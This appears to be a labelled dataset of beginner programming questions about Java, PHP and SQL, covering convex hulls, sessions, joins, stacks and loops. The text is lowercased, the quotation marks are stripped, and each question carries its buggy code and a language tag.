if(merged.length &lt;= 3)         return convexhull(merged);      else {          lexisort(merged);         //split(p  a  b);         //split         double p = merged.length;         int a;         int b;          if (p%2 == 0){//even             a = (int) (p/2);             b = (int) (p/2);         }         else//odd             a = (int) (1+(p/2));             b = (int) (p/2);            int arraya[][] = new int[a][2];          int arrayb[][] = new int[b][2];          for (int i=0; i&lt;a; i++){             arraya[i][0] = merged[i][0];             arraya[i][1] = merged[i][1];         }          for (int i=0; i&lt;b; i++){             arrayb[i][0] = merged[i+a][0];             arrayb[i][1] = merged[i+a][1];         }          for ( int i=0; i&lt;arraya.length; i++){             system.out.println(  merged array a coordinates:   + arraya[i][0] +     + arraya[i][1]);}         for ( int i=0; i&lt;arrayb.length; i++){             system.out.println(  merged array b coordinates:   + arrayb[i][0] +     + arrayb[i][1]);}          lowert(arraya  arrayb);         //uppert(arraya  arrayb);           return merged(dchull(convexhull(arraya))  dchull(convexhull(arrayb)));      }  }  public static int[][] lowert(int [][] hulla  int [][]  hullb){      int a = 0;     int b = 0;      //lower tangent     //(1) let a be the rightmost point of ha .     for (int i=0; i&lt;hulla.length; i++){         if (a &lt; hulla[i][0]){             a = hulla[i][0];         }     }     //(2) let b be the leftmost point of hb .     for (int i=0; i&lt;hullb.length; i++){         if (b &lt; hullb[i][0]){             b = hullb[i][0];         }     }     for (int i=0; i&lt;hullb.length; i++){         if (b &gt; hullb[i][0]){             b = hullb[i][0];         }     } </code></pre>   the code finishes after working out a of ha and b of hb however i do not understand (3) or more precisely how to code it using the elements i have.     (1) let a be the rightmost point of ha .

what is the proper usage of $_session in php  <strong>according to <a href= http://www.php.net/manual/en/intro.session.php  rel= nofollow >php website</a>  session support in php consists of a way to preserve certain data across subsequent accesses.</strong> this enables you to build more customized applications and increase the appeal of your web site. a visitor accessing your web site is assigned a unique id  the so-called session id. this is either stored in a cookie on the user side or is propagated in the url. the session support allows you to register arbitrary numbers of variables to be preserved across requests.    tapping onto the experience of programmers here  i would like to know what are the <strong>things that should be stored</strong> in <code>$_session</code> and what are the <strong>things that should not</strong>. example  is it a good idea to store data in a session to avoid repeated queries on the database,php

unique records based on same ids with different type  i have first table like this:   <pre><code>id    email     100  a@a.com   200  b@b.com </code></pre>   i have second table like this(permissions shared):   <pre><code>   id   assigned id  role    100    200        normal user    100    100        super user    200    200        normal user  </code></pre>   ie. 100 is a super user and can access the sharing features of id 200.   <pre><code>select t1.id t1.email t2.role from table t1  table t2 where t1.id=t2.id; </code></pre>   when i combine both the top 2 tables  i get like this   <pre><code>id     email      role  100    a@a.com    super  user  100    a@a.com    normal user 200    b@b.com    normal user </code></pre>   i want to get  output like this:    <pre><code>id     email      role     100    a@a.com    super  user  200    b@b.com    normal user </code></pre>   ie. if any user has a type of super user rights  just take that entry and don t need the type for normal user.    if the email is already present as super user and further the same email is assigned to someone  then the query should return only for super user.    i even tried using group by and union all:   <pre><code>  select t1.id t1.email t2.role from table t1  table t2    where t1.id=t2.id group by t1.email having t2.role= super user    and not exists (  select t1.id t1.email t2.role from table t1  table t2    where t1.id=t2.id group by t1.email having t2.role= super user )   union all   select t1.id t1.email t2.role from table t1  table t2    where t1.id=t2.id group by t1.email having t2.role&lt;&gt; super user ; </code></pre>   but seemed to give incorrect answer. any thoughts,sql

how to write an array without length  i m trying to write a program that looks for three numbers in array that gives an arithmetic sequence of length three - three numbers a b and c form an arithmetic sequence of length 3 if: b-a = c-b.    i have 2 problems:   <ol> <li> i need to read an arbitrary number type int  and put them inside an array. for example: java string 3 4 5 6  gives array: [3] [4] [5] [6]. and i couldn t do it because when creating an array it asks for the array length. </li> <li> i guess i have a problem when writing the math command for <code>b-a = c-b</code>. </li> </ol>   .   <pre><code>public static void main (string[] args) {      int [] a = new int [10];     for (int i = 0; true; i++) {       a[i] = integer.parseint(args[i]);     }      system.out.println(a.length);     for (int i = 0; i &lt; a.length; i++) {        for (int j=i+1; j&lt;a.length; ++j) {         int sum = a[i]-a[j];         int tempa = a[i];         int d = a[i+1];         int c = a[i+2];         if (d == tempa+d &amp;&amp; c == tempa +  2*d)             system.out.println( yes );          }      } } </code></pre>,java

chaining records by fields  i have a data set (currently in access 2007 format) which has 2 tables  simplified to    category   <blockquote> <pre><code>categoryid | category name | first item   1          | category 1    | i1 2          | category 2    | i2 3          | category 3    | i3 </code></pre> </blockquote>   items   <blockquote> <pre><code>itemid     | item name  | next item   i1         | item 1     | i4 i2         | item 2     | i5 i3         | item 3     | i6 </code></pre> </blockquote>   the category defines the first item and each subsequent item references the next item until an item s next item is null  so it should be possible to find all the items for a particular category by continually following the next item field. is this possible in sql or do i need to drop out to a script to process it  i was hoping that there was at least a half-way house in that a sql query could get me some of the way before using vbscript or similar.    i could import this to sql server if that provides additional functionality not available in access.,sql

php script not checking multiple lines in .txt file  i m trying to make a simple login script that will check the inputted username and password against a .txt file.  the problem i have found is that my script only checks the first line of my .txt file. that is  if the first line of the .txt file reads  test|test123  and i enter  test  as the username and  test123  as the password  everything works.  however  when i do the same with the rest of my lines  it returns the  invalid password or username  statement.  i believe my script is not checking other lines in my .txt file against the inputted username and password   how can this be fixed    <pre><code>&lt; php  $check = 0; if (isset($_post[ submit ])) {  $username = htmlentities($_post[ name ]); $username = strtolower($username); $password = htmlentities($_post[ apw ]); $filename = getcwd() .  /atextfile.txt ; $lines = file( $filename   file_ignore_new_lines ); foreach($lines as $key =&gt; $line) {     list($name  $pw) = explode( |   $line);     if($name == $username &amp;&amp; $pw == $password) $check++; break;    } if ($check == 1){ header( location: index.php );  }  else{ printf( your username or password are invalid. please try again. );  }  }   &gt;  &lt;form method =  post  action =  &lt; php echo $_server[ php_self ];  &gt; &gt; &lt;p&gt; username:&lt;br /&gt; &lt;input type =  text  id= name  name= name  size= 20  maxlength= 40  /&gt; &lt;/p&gt;  &lt;p&gt; password:&lt;br /&gt; &lt;input type =  password  id= apw  name= apw  size= 20  maxlength= 40  /&gt; &lt;/p&gt;  &lt;input type= submit  id= submit  name = submit  name = submit  value= log in  /&gt;  &lt;p&gt; &lt;a href= register.php &gt;register&lt;/a&gt;&lt;/p&gt; &lt;/form&gt; </code></pre>,php

stop sql returning the same result twice in a join  i have joined together several tables to get data i want but since i am new to sql i can t figure out how to stop data being returned more than once.    her s the sql statement;   <pre><code>select    t.url     t.id      s.status     s.id      e.action     e.id     e.timestamp  from tracks t  status s  events e where s.id and t.id = e.id  order by e.timestamp desc </code></pre>   the data that is returned is something like this;   <pre><code>+----------------------------------------------------------------+ | url | id | status | id | action               | id | timestamp | +----------------------------------------------------------------+ | t.1 | 4  | hello  | 4  | has uploaded a track | 4  | time      | | t.2 | 3  | bye    | 3  | has some news        | 3  | time      | | t.1 | 4  | more   | 4  | has some news        | 4  | time      | +----------------------------------------------------------------+ </code></pre>   that s a very basic example but does outline what happens. if you look at the third row the url is repeated when there is a different status.    this is what i want to happen;   <pre><code>+-------------------------------------------------------+ | url or status | id | action               | timestamp | +-------------------------------------------------------+ | t.1           | 4  | has uploaded a track | time      | | hello         | 3  | has some news        | time      | | bye           | 4  | has some news        | time      | +-------------------------------------------------------+ </code></pre>   please notice that the the url (in this case the mock one is t.1) is shown when the action is has uploaded a track. this is very important. the action in the events table is inserted on trigger of a status or track insert. if a new track is inserted the action is  has uploaded a track  and you guess what it is for a status. the id and timestamp is also inserted into the events table at this point.    <strong>note:</strong> there are more tables that go into the query  3 more in fact  but i have left them out for simplicity.,sql

redirect after x clicks  ( to different/multiple links)  im aware that you can t track  clicks   as they re strictly client/visitor side. i thinks its possible to track <code>everytime</code> they do an <code>onclick</code> on my page and update the form field which get submitted. or use <code>xmlhttprequest</code>  but i m not sure on where i should start with this info.    i think the best way to go would be to  to track hits <code>(in php)</code> to my <code>script/ webpage/button</code>. i m thinking i can do this with:   <pre><code>session_start(); $_session[ hits ] = isset($_session[ hits ])   $_session[ hits ] + 1 : 0; if ($_session[ hits ] &gt; 100) header( location: /whatever.php ); </code></pre>   am i on the right track with this,php

illegal string offset - small issue  yes i know this has been asked a zillion times but still left puzzled.     the bottom line in the code:    <pre><code>$this-&gt;labels[$row[ id ]] = $row[ content ]; </code></pre>   how can this be better written so as to avoid an illegal offset in php      trying to make sense of the php manual but confused..     using true as a key will evaluate to integer 1 as key. using false as a key will evaluate to integer 0 as key. using null as a key will evaluate to an empty string. using an empty string as key will create (or overwrite) a key with an empty string and its value  it is not the same as using empty brackets.    you cannot use arrays or objects as keys. doing so will result in a warning:illegal offset type.    any good articles that i can read so as to correct this in future    <pre><code>    $sql =  select `l`.`id`  `c`.`content`             from `{$this-&gt;table_2}` `l`             left join  `{$this-&gt;table_3}` `c`                 on `c`.`label` = `l`.`id`;             where `c`.`language` =               order by `l`.`name` asc ;             $labels = $this-&gt;db-&gt;getall($sql  $this-&gt;language);             if (empty($labels)) {                 setcookie( lang   1  time() + 31536000   / );                 $this-&gt;language= 1;     $sql =  select `l`.`id`  `c`.`content`             from `{$this-&gt;table_2}` `l`             left join  `{$this-&gt;table_3}` `c`             on `c`.`label` = `l`.`id`             where `c`.`language` =               order by `l`.`name` asc ;             $labels = $this-&gt;db-&gt;getall($sql  $this-&gt;lanaguage);             }             if (!empty($labels)) {                 foreach($labels as $row) {                  $this-&gt;labels[$row[ id ]] = $row[ content ];                 }         } } </code></pre>,php

difference between a static and a final static variable in java  generally  final static members especially  variables (or static final of course  they can be used in either order without overlapping the meaning) are extensively used with interfaces in java to define a <strong>protocol behavior</strong> for the implementing class which implies that the class that implements (inherits) an interface must incorporate all of the members of that interface.    <hr>   i m unable to differentiate between a <strong>final</strong> and a <strong>final static</strong> member. the final static member is the one which is a static member declared as final or something else  in which particular situations should they be used specifically    <hr>   a static variable or a final static variable can never be declared inside a method neither inside a static method nor inside an instance method. why     the following segment of code accordingly  will not be compiled and an compile-time error will be issued by the compiler  if an attempt is made to compile it.   <pre><code>public static void main(string args[]) {     final int a=0;  //ok      int b=1;  //ok      static int c=2;  //wrong      final static int x=0;  //wrong } </code></pre>,java

why does php s foreach advance the pointer of its array (only) once   this is a question of curiosity about the reasons behind the way <code>foreach</code> is implemented within php.    consider:   <pre><code>$arr = array(1 2 3); foreach ($arr as $x) echo current($arr) . php_eol; </code></pre>   which will output:   <pre><code>2 2 2 </code></pre>   i understand that <code>foreach</code> rewinds array pointers to the beginning; however  why does it then increment it only once  what is happening inside the magic box   is this just an (ugly) artefact    <hr>   thanks @nickc -- for anyone else curious about <code>zval</code> and <code>refcount</code>  you can read up on the basics <a href= http://php.net/manual/en/features.gc.refcounting-basics.php  rel= noreferrer >here</a>,php

query about application t-sql joins  we have a table with the following structure - table(id  key_type  key_value) where (id  key_type) is the primary key.    due to some bug in the softwares writing to this table  there can be cases where you have same  combinations of (key_type key_value) but with different ids.    we want to find out all such incorrect data  where all the combinations of (key_type key_value) are same even though id can be different.    interestingly  the number of such combinations will vary i.e. they are not same across all the ids.    for example     if the rows are -    <ol> <li>(1  type1  value1)</li> <li>(1  type2  value2)</li> <li>(2  type1  value1)</li> <li>(2  type2  value2)</li> <li>(3  type3  value3)</li> <li>(4  type4  value4)</li> <li>(5  type3  value3)</li> <li>(6  type1  value1)</li> <li>(6  type3  value3)</li> </ol>   the query should flag off ids (1 &amp; 2) and (3 &amp; 5) maybe the solution is trivial but i would blame it to my little experience with sql. can someone please help me out here  thanks!,sql

make output print once per loop  not each iteration  i have a class that is designed to search a file for a user-specified string. the class works as it should  cycling through a file containing multiple lines and printing - provided the specified string exists - the line(s) containing the desired string. the issue i m having at the moment is that my else statement (provide new word if previous word does not exist) runs for every line (as it should)  but i only want it to run once per loop. here is my code    <pre><code>public class simpledbsearch {    public void sdbsearch(scanner searchword) throws ioexception{      //prompt user for input     system.out.println( please input the word you wish to find: );      //init string var containing user input     string wordinput = searchword.next();      //specify file to search     file file = new file( c:/users/joshua/desktop/joutfiles/testfile.txt );      //init scanner containing specified file     scanner filescanner = new scanner(file);      //loops through every line looking for lines containing previously specified string.     while(filescanner.hasnextline()){         string line = filescanner.nextline();         if(line.contains(wordinput)){       //if desired string is found  print line containing it to console             system.out.println( i found the word you re looking for here:   + line);         }else{      //if desired string not found  prompt user for new string. i want this to occur only once  not per every line-check             system.out.println( please input a new word );         }     } } </code></pre>,java

sql if( exists()) query duplication  i need to write a a query that gets a set of information from a table  but if there is no information for that specific client  then use the default set.  i was wondering if there is a way to avoid query duplication in an if(exists()) statement.    for example:   <pre><code>if( exists( select * from usertable where name = @username)) begin     select * from usertable where name = @username)) end else begin     select * from usertable where name =  jon skeet )) end </code></pre>   the first two selects (exists and the true part of the if) are the exact same.  i want to avoid running the same query twice if the statement is true.  i know the exists stops once the first true condition is met but that is still o(n) worst case.    another option i know of  is put the information in a temp table and check if information is there  if not return the default information.    both ways would work but what is the best way to do it   are there other ways to do this   is there some way to do this in the where clause since that s the only thing that is different     edit:  fixed example to return a row not just a single item.  so the answers of dumping the select to a single variable would be equal to a temp table i assume.  also  to not anger jon skeet  spelled his name right,sql

why do repeated values appear in sql results  i m with a doubt about joins. for example  using an example database dvdrental  this query:   <pre><code>select customer.customer_id          first_name          last_name from customer  inner join payment on customer.customer_id = payment.customer_id </code></pre>   some records appear repeated  for example  it appears 3 times  342 harold martino  like:   <pre><code>342   harold   martino  342   harold   martino  342   harold   martino </code></pre>   do you know why it appears repeated records like in this example that appears the same record 3 times  this repetition means that there are 3 records in the payment table where customer_id = 342  but this query  select * from payment where customer_id = 342  returns 32 records. so i m not understanding properly how the join works.,sql

java xml dom with lots of data  how can i buffer it   i have a java program that is generating xml data which happens to be very large. i am using the typical parsers in javax.xml and the org.w3c.dom objects. the dom in memory is becoming so large that it occasionally runs out of memory. now  the reason it reaches the memory limit is because the program is generating all of the data at once and then transforming it to a string and then to a file. there are hundreds of elements being generated at once that could be made one at a time and buffered to a file rather than slowly filling the ram. i ve been looking into libraries out there but i m a bit confused on what is good. what method should i be using to buffer this dom document to a file rather than generating all at once,java
filter_var function vs reg. expressions  i think this is probably a fairly easily answered question:    im new to regular expressions in general  but i have recently heard that filter_var is almost replaceing the expressions.      i can see  after looking at the function  that i could validate emails in general.  but is there capabilities to narrow the validation     my issue is im trying to validate an email to only return true if it ends in @boisestate.edu or @u.boisestate.edu.  i cant seem to figure out if filter_var has those kinds of specific capabilities.  any help would really be appreciated!  also  if you have a reg expression or filter_var function that would suit this validation...id really appreciate it!,php

making my own data type  i m new to programming and java. i m trying to write my own data type/collection class but i m not quite sure how to go about it.     i want a class that contains a string  and an array-list of strings.    usually i would go about making a data type like this:   <pre><code>public class collection {      private int id;     private string word;     private int howmany;     private char firstchar;      public collection (int i  string w  int h  char f){         id = i;         word = w;         howmany = h;         firstchar = f;     } //getters and setters } </code></pre>   not sure how i can do this with an arraylist field.     my goal behind this is to have a class of unique words in the string field read in from .txt files and in the arraylist field have all the .txt file names that contain that word.     edit: building on tom anderson s response and what i initially thought to do:   <pre><code>public class collection {      private int id;     private string word;     private int howmany;     private char firstchar;     private list&lt;string&gt; filenames;      public collection (int i  string w  int h  char f  list&lt;string&gt; filenames){         id = i;         word = w;         howmany = h;         firstchar = f;         this.filenames = filenames;     }  } </code></pre>   i m still not sure how to use this since i can not simply add a string to the arraylist parameter when creating a new instance of the my collection class. such as this:   <pre><code>arraylist&lt;collection&gt; collection = new arraylist&lt;collection&gt;(); collection newtest= new collection( test   test ); collection.add(newtest); </code></pre>,java

how do i make a program with multiple classes run until the user specifies  e  instead of terminating at the end of main   i m working on a program that allows a user to read a file  search for specific text (still in progress) in a file and write (append) to a file. the program has four classes  with one method in each  corresponding to each of the functions of the program.     my first class (containing main) prompts the user to specify whether they want to read/search/write to a default file. like so:   <pre><code>public class simpledbfunction {      public static void main(string args[]) throws ioexception{          //prompt user to provide input in accordance with desired function         system.out.println( type  r  to read a file;  s  to search for text within a file;  w  to write to a file;  e  to exit );          //initialize scanner and a string variable to hold the value of scanner variable         scanner ichoice = new scanner(system.in);       //ichoice - inputchoice         string userchoice = ichoice.next();          //if user specifies  r  go to filereader class         if(userchoice.equalsignorecase( r )){             simpledbreader sdbrobject = new simpledbreader();             sdbrobject.sdbreader(args);          //if user specifies  s  go to textsearch class         }else if(userchoice.equalsignorecase( s )){             simpledbsearch sdbsobject = new simpledbsearch();             sdbsobject.sdbsearch(args);          //if user specifies  w  go to filewriter class         }else if(userchoice.equalsignorecase( w )){             simpledbwriter sdbwobject = new simpledbwriter();             sdbwobject.sdbwriter(args);          //if user specifies  e  terminate program         }else if(userchoice.equalsignorecase( e )){             system.exit(0);         }         ichoice.close();        //close scanner  probably redundant here     } } </code></pre>   the specific issue i have is that i want the program to run in this  state  of awaiting user input  even after the user has already prompted the program to perform one of the actions. i have tried to use both a while loop  and a do-while loop  to achieve this; but both ended up infinitely repeating whichever function the user specifies instead of running it once and returning to main. i also tried to utilize  break  in a few different positions (foolish of me)  only to find that it terminates my program completely when it is reached.    i m still a programming green-horn  so please bear with me. i know that my code isn t the most polished thing around and that there are a multitude of ways to improve it  but what i want is full functionality before i begin improving. if you wish to see the classes pertaining to reading  searching and writing please let me know.,java

need help in merging questions with the answer  i m creating a calculator which has to work out expressions like (12.0 + 10.0) * 3.0 so far i have created the sub classes according to each mathematical operation.    for example:    addition. java   <pre><code>class addition extends arithmeticexpression {     addition(double value1  double value2) {         result = value1 + value2;         this.value1 = value1;         this.value2 = value2;     }     public addition( arithmeticexpression an double num2) {         value1 = an.evaluate();         value2 = num2;         result1 = value1 + value2;     }     public double evaluate1() {         system.out.println( arbitrary answer is );         return result1;     }     public double display1() {         system.out.println( arbitrary question is );         system.out.println(  (  + value1 +  +   + value2 +  )  +   =  + result1);         return result1;     }     public double display() {         system.out.println( addition question is );         system.out.println(value1 +   +  + value2);         return result;     }     public double evaluate() {         system.out.println( addition answer is );         system.out.println(result);         return result;     } } </code></pre>   and another for the multiplication which is similar to that but multiplies in stead of adding. i then created a class for the question i am answering the class is below. arbitrary.java   <pre><code>public class arbitrary {     public arbitrary() {            addition arbitrary1 = new addition(12.0 10.0);            arbitrary1.display1();            multiplication arbitrary2 = new multiplication(arbitrary1 3.0);            arbitrary2.display2();     } } </code></pre>   when it displays the answer it displays:   <pre><code>arbitrary question is (12.0+10.0) =0.0 addition answer is 22.0 arbitrary question is (22.0*3.0) = 66.0 </code></pre>   any suggestions on how i can print out the original question next to the answer,java

which tostring technique is more efficient   i have a class called zebra (not her actual name). zebra overrides the tostring method to provide her own convoluted obfuscated stringification.    which is more efficient to stringify an instance of zebra  presuming that i have to do this stringification millions of times per session.   <ol> <li><code>zebra.tostring()</code></li> <li><code>  +zebra</code></li> <li><code>static string blank (singleton)</code><br> <code>blank+zebra (multiple executions)</code>.</li> </ol>   where the value of zebra is not assured to be the same.    i am conjecturing that the answer could be - no concern: the compiler makes them all equivalent. if that is not the answer  please describe the instantiation process that makes them different. (2) and (3) could be the same  since the compiler would group all similar strings and assign them to a single reference.    normally  i do <code>  +zebra</code> because i am too lazy to type <code>zebra.tostring()</code>.    <strong>attn</strong>: to clarify.    i have seen questions having been criticised like  why do you want to do this  it s impractical  if every programmer refrains from asking questions because it has no practical value  or every mathematician does the same - that would be the end of the human race.    if i wrote an iteration routine  the differences might be too small. i am less interested in an experimental result than i am interested in the difference in processes:    for example  zebra.tostring() would invoke only one tostring while   +zebra would invoke an extra string instantiation and and extra string concat. which would make it less efficient. or is it. or does the compiler nullify that.     please do not answer if your answer is focused on writing an iterative routine  whose results will not explain the compiler or machine process.    virtue of a good programmer = lazy to write code but not lazy to think.,java

why is it saying stack is empty even though i push something into it   for some reason when i call the stack1.empty() or stack1.isempty()  it returns true even though i pushed something into the stack  here is the method i use to push something into the stack...   <pre><code>//case b:      else if(currentchar ==  ( ){          character charobj = character.valueof( ( );          stack1.push(charobj);          system.out.println( case b );      } </code></pre>   basically it iterates through each character in a string  and does one of the cases that i coded. in this case  the character is a  (   so i have it pushed into the stack.     now  the next character in the string is a letter  so this case is called:   <pre><code>//case a:      if(currentchar !=  +  &amp;&amp; currentchar !=  -  &amp;&amp; currentchar !=  *  &amp;&amp; currentchar !=  /  &amp;&amp; currentchar !=  (  &amp;&amp; currentchar !=  )  ){          postfixstring += currentchar;          system.out.println( case a );      } </code></pre>   that method works fine. now the next part goes wrong for some reason. the next thing in the string is a *. so  it s supposed to run a certain case that i coded  but instead it runs a different case....here is the case that it runs:   <pre><code>//case c:      else if(stack1.empty() &amp;&amp; currentchar ==  +  || currentchar ==  -  || currentchar ==  *  || currentchar ==  / ){          stack1.push(currentchar);          system.out.println( case c );      } </code></pre>   as you can see  the only way to run this case is if the stack <em>is</em> empty  but it s not empty! i pushed something into the stack... i don t understand why it keeps running this case even though the stack is not empty.     i want it to run this case instead:   <pre><code>     //case d: if character is an operator  it goes into a loop checking if topstack is higher precedence to the current character      // if it is  the stack pops onto the end of the postfix string. if it isn t  the stack pushes the current scanned character.      // it then breaks out of the loop      else if(currentchar ==  +  || currentchar ==  -  || currentchar ==  *  || currentchar ==  /  &amp;&amp; !stack1.isempty()){          char topstack = stack1.peek();          while(!stack1.isempty()){             if(precedence(topstack  currentchar)){                 postfixstring += stack1.pop();             }             else{                 stack1.push(currentchar);                 break;             }              system.out.println( case d );          }         } </code></pre>   i mean it should run case d  but instead it runs case c. why is it doing this     edit:    here s the entire class:   <pre><code>import java.util.stack;  public class infixtopostfixconverter { //********************************************************************** //the precedence method determines the precedence between two operators. //if the first operator is of higher or equal precedence than the second //operator  it returns the value true  otherwise it returns false. //***********************************************************************    public static boolean precedence(char topstack  char currentchar)    {    if(topstack == currentchar){        return true;    }     // if topstack is division or multiplication  it will always have precedence no matter what    if(topstack ==  /  || topstack ==  * ){        return true;    }    // if topstack is addition or subtraction...    else if(topstack ==  +  || topstack ==  - ){        if(currentchar ==  +  || currentchar ==  - ){            return true;        }        else if(currentchar ==  *  || currentchar ==  / ){            return false;        }    }     return false;    }  //************************************************************************* //the static converttopostfix method will convert the infixstring //into the corresponding postfix string. check the algorithm on //assignment #11 s description page. mark each case clearly inside the code //*************************************************************************    public static string converttopostfix(string infixstring)    {   //initialize the resulting postfix string   string postfixstring =   ;    //initialize the stack   stack&lt;character&gt; stack1 = new stack&lt;character&gt;();   //obtain the character at index i in the string   for (int i=0; i &lt; infixstring.length(); i++)   {      char currentchar = infixstring.charat(i);      //case a:      if(currentchar !=  +  &amp;&amp; currentchar !=  -  &amp;&amp; currentchar !=  *  &amp;&amp; currentchar !=  /  &amp;&amp; currentchar !=  (  &amp;&amp; currentchar !=  )  ){          postfixstring += currentchar;          system.out.println( case a );      }      //case b:      else if(currentchar ==  ( ){          stack1.push(currentchar);          system.out.println( case b );      }       else if(currentchar ==  +  || currentchar ==  -  || currentchar ==  *  || currentchar ==  / ){          //case c          if(stack1.isempty()){              stack1.push(currentchar);              system.out.println( case c );          }          //case d          else{              char topstack = stack1.peek();               while(!stack1.isempty()){                 if(precedence(topstack  currentchar)){                     postfixstring += stack1.pop();                 }                 else{                     stack1.push(currentchar);                     break;                 }                  system.out.println( case d );              }          }      }     //case e:      else if(currentchar ==  )  &amp;&amp; !stack1.isempty()){          while(!stack1.isempty() &amp;&amp; stack1.peek() !=  ( ){              postfixstring += stack1.pop();              system.out.println( case e );          }          if(!stack1.isempty() &amp;&amp; stack1.peek() ==  ( ){              stack1.pop();          }      }     } //end of for loop       //case f:   if(!stack1.isempty() &amp;&amp; stack1.peek() ==  ( ){       return  no matching close parenthesis error. ;   }   else if(!stack1.isempty() &amp;&amp; stack1.peek() !=  ( ){       while(!stack1.isempty() &amp;&amp; stack1.peek() !=  ( ){           postfixstring += stack1.pop();       }   }    system.out.println( case f );   return postfixstring;   }//end of converttopostfix method  }//end of the infixtopostfixconverter class </code></pre>,java

how do i stop my count variable incrementing incorrectly in my applet   i am using a button in my applet to add words to a linkedlist. it however is currently not working correctly. it seems like every time the  add word  button is selected it holds the previous number as the count value and is incrementing with the old value instead of just going up in 1 s each time. this is causing the incorrect value to be printed when the search button is selected and the wrong number is outputted. how do i make the count variable hold the correct value despite the number of times  add word  is selected.   <pre><code>import javax.swing.*;

how to implement class alkio   i have following problem to be solved in java: implement class alkio. test with a done main programme alkiopaa.java with which you see that your class functions. my answer to this question is following:    <pre><code>/** * @author a. * @version 28.11.2011 * tehtävä5. ohjelma toteuttaa luokan alkio  */  public class alkio {   private int rivi;   private int sarake;   private int arvo;      public alkio(int rivi  int sarake  int arvo){     int rivi= rivi;     int sarake=sarake;     int arvo=arvo;   }    public void setalkio(int rivi  int sarake  int arvo){     system.out.println( ( +rivi+   +sarake+   +arvo+ ) );   }    public int getarvo(){     return arvo;   }    public int getrivi(){     return rivi;   }    public int getsarake(){     return sarake;   }    //jotain häikkää seuraavassa( 28.11.2011). häikkä poistunut(29.11.2011)   public string tostring(){     string merkkijono= new string();     return merkkijono;   } } </code></pre>   are there any comments  then test is done with main programme alkiopaa.java which is following:    <pre><code>public class alkiopaa {    public static void main(string[] args) {      alkio eka = new alkio(1 2 10);      system.out.println( tein alkion  jonka rivi on   + eka.getrivi()         +   ja sarake on   + eka.getsarake() +  . arvo on   + eka.getarvo());       system.out.println( \n alkio on   + eka.tostring());      string apu = eka.tostring();      system.out.println( alkio   + apu);      eka.setalkio(2  5  12);      system.out.println( muutettu alkio   + eka);   } } </code></pre>   when i run main-program it prints:    <pre><code>tein alkion  jonka rivi on 0 ja sarake on 0. arvo on 0 </code></pre>   alkio on alkio (2 5 12) muutettu alkio so it does not print (1 2 10) as should be.,java
call baseclass method on extendedclass object when defined as baseclass  imagine following code:   <pre><code>public class baseclass {     private int a;      public void noreturnnoparam() {         system.out.println( from base class );     } }  public class extendedclass extends baseclass {     private int b;      @override     public void noreturnnoparam() {         system.out.println( from extended class );     } }  public class polymorph {     public static void main(string... args) {         baseclass bc = new baseclass();         extendedclass ec = new extendedclass();         baseclass bcec = new extendedclass();          bc.noreturnnoparam();         ec.noreturnnoparam();         bcec.noreturnnoparam();     } } </code></pre>   output is as follows:   <pre><code>from base class from extended class from extended class </code></pre>   so how can i achieve that  on calling bcec.noreturnnoparam() the baseclass` method is called  (and only if the extendedclass object is stored in a baseclass type),java
java fixed number of elements in an array  when i create an array in java - int array[] and array=new int[some number] -    how can i construct it if i don t know how many values it will hold so that i have enough space in it,java
loops and probabtily  i have to have the computer compute all the possible ways three dice can be thrown: 1 + 1 + 1  1 + 1 + 2  1 + 1 + 3  etc.  add up each of these possibilities and see how many give nine as the result and how many give ten.   <pre><code>    public class prog209b { public static void main(string []args){      int sum = 0;     int count = 0;     do{         for(int i = 1; i&lt;=6; i++){             count +=1;             for(int y=1; y&lt;=6; y++){                 count += 1;                 for(int x=1; x&lt;=6; x++ ){                      sum = i + y + x;              }         }      }    }while (sum == 10 &amp;&amp; count == 27);{       system.out.println( there are   +count +  ways to get ten );  } } } </code></pre>   thats what i came up with but i can get it to work correctly at all. instead of giving me that theres 27 ways it gives me like 42. obviously im not doing this correctly. please help me before i have an aneurysm,java
how can i set a flag value in an array loop   i have an array as shown below.    basically in this array  sometimes thebagdata[i].getsecuritytype()  may or may not contain values in an array.   <pre><code> for (int i = 0; i &lt;bagdata.length; i++) {                 if (bagdata[i].getsecuritytype() != null) {                     flag = true;                 } else {                     flag = false;                 }              } </code></pre>   i think that my code is overriding the flag value. how can i deal with this,java
